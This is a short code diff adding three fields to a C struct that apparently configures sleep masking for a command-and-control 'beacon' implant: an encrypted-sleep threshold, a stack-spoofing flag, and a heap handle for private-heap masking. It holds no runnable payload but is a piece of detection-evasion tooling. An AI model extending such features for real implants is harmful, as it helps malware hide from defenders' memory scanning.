@@ -60,6 +60,13 @@ typedef struct _NAX_SM_INFO {
      * (the _Static_asserts below enforce the layout on both sides). */
     PVOID   PrivateBase;    /* NULL = instance masking disabled */
     UINT32  PrivateLen;
+    /* P11 - encrypted-sleep threshold (ms): sleeps below this skip the P2
+     * mask/protect cycle. 0 = use built-in default (1000 ms). */
+    UINT32  MinSleepMs;
+    /* P5 - full-wait stack spoof enable (0/1); no effect when SpoofReady==0 */
+    UINT32  WaitSpoof;
+    /* P6 - private-heap masking: beacon-owned heap handle; NULL = disabled */
+    PVOID   HeapHandle;
 } NAX_SM_INFO, *PNAX_SM_INFO;
 
 /* ========= [ function call descriptor ] ========= */
